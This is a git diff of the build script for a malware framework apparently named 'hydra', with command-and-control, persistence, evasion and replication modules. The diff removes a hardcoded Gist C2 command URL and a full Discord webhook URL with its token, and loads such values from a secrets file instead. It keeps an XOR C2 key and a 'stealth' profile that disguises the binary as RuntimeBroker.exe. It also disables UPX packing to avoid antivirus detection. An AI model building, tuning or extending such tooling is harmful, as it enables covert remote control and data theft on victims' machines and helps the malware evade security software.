@@ -23,12 +23,26 @@ import hashlib
 # CONFIG — Edit these before building!
 # ═══════════════════════════════════════════════════════
 
+# ═══ Secrets (loaded from gitignored secrets.json at build time) ════
+# Copy secrets.example.json → secrets.json and fill in real values.
+# NEVER commit secrets.json!
+
+import json as _json
+SECRETS_FILE = os.path.join(os.path.dirname(__file__), "secrets.json")
 REAL_CONFIG = {
-    "gist_url": "https://gist.githubusercontent.com/vLoon-jpg/1f0e405b0ca1f4dec525f10aa326575f/raw/c2_command.txt",
-    "discord_webhook": "https://discord.com/api/webhooks/1513957984458375197/rbRO6VAqk31KJNGDX5kAdibQZoaC5KjW0LJlQtGPph_MPPGYWawhrgAYkXUBkx0w1Uac",
-    "tg_token": "***",  # Set via environment: TG_BOT_TOKEN
-    "c2_key": "hydra_c2_key_v4",  # XOR key for Gist message encryption
+    "gist_url": "https://gist.githubusercontent.com/PLACEHOLDER/raw/c2.txt",
+    "discord_webhook": "https://discord.com/api/webhooks/PLACEHOLDER",
+    "c2_key": "hydra_c2_key_v4",
+    "tg_token": "",
 }
+
+if os.path.exists(SECRETS_FILE):
+    with open(SECRETS_FILE) as f:
+        loaded = _json.load(f)
+        REAL_CONFIG.update(loaded)
+else:
+    print("[!] secrets.json not found — building with placeholder C2 URLs")
+    print("[*] Copy secrets.example.json → secrets.json and fill in real values")
 
 # Build profiles
 PROFILES = {
@@ -45,9 +59,9 @@ PROFILES = {
     "stealth": {
         "name": "RuntimeBroker.exe",
         "console": False,
-        "upx": True,
-        "onefile": True,
         "strip": True,
+        "onefile": True,
+        "upx": False,  # DISABLED — UPX attracts AV, not evades it
         "hidden_imports": ["hydra", "hydra.core", "hydra.sandbox", "hydra.evasion",
                           "hydra.c2", "hydra.persistence", "hydra.recon",
                           "hydra.replication", "hydra.watchdog", "hydra.modules",
